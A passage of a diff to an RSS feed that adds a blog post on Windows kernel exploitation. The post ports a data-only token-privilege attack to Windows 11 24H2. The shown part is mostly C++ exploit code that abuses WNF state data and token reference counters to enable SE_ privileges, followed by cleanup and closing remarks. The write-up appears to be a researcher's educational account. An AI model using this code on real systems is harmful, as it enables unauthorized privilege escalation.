+&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BnoIsolationHandlesEntry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process_token_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offsetof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_TOKEN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Privileges&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offsetof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_SEP_TOKEN_PRIVILEGES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Enabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;privs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;set_res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lNtUpdateWnfStateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curr_wnf_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TypeID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;privs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;amount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bool_result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DuplicateToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;manipulated_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecurityAnonymous&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf_en&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bool_result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Duplicate token failed pres&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// set the BnoIsolationHandlesEntry to NULL so we can close the modified token without crashing&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BnoIsolationHandlesEntry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;set_res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lNtUpdateWnfStateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curr_wnf_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TypeID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When you finished enjoying your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SE_Privileges&lt;/code&gt;, you can simply close the handles and the privilege will be gone again:&lt;/p&gt;
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;privs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;amount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CloseHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf_en&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CloseHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf_pres&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf_en&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf_pres&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;closing-thoughts&quot;&gt;Closing thoughts&lt;/h2&gt;
+&lt;p&gt;So this technique is nothing revolutionary. We just ported an data-only attack technique to 24H2 with a little trick abusing reference counters.
+I’m far from an expert in Windows Kernel exploitation. I just wanted to share the reference counter trick and document the entire exploitation strategy. I hope somebody maybe find it useful.&lt;/p&gt;
+
+&lt;p&gt;And if you find any errors please tell me and I will fix them :)&lt;/p&gt;
+</description>
+        <pubDate>Fri, 04 Apr 2025 08:22:42 +0200</pubDate>
+        <link>http://localhost:4000/blog/2025-04-05-porting-to-24H2/</link>
+        <guid isPermaLink="true">http://localhost:4000/blog/2025-04-05-porting-to-24H2/</guid>
+        
+        
+        <category>Exploit Development</category>
+        
+        <category>Windows Kernel</category>
+        
+      </item>
     
       <item>
         <title>.echo Hello World</title>
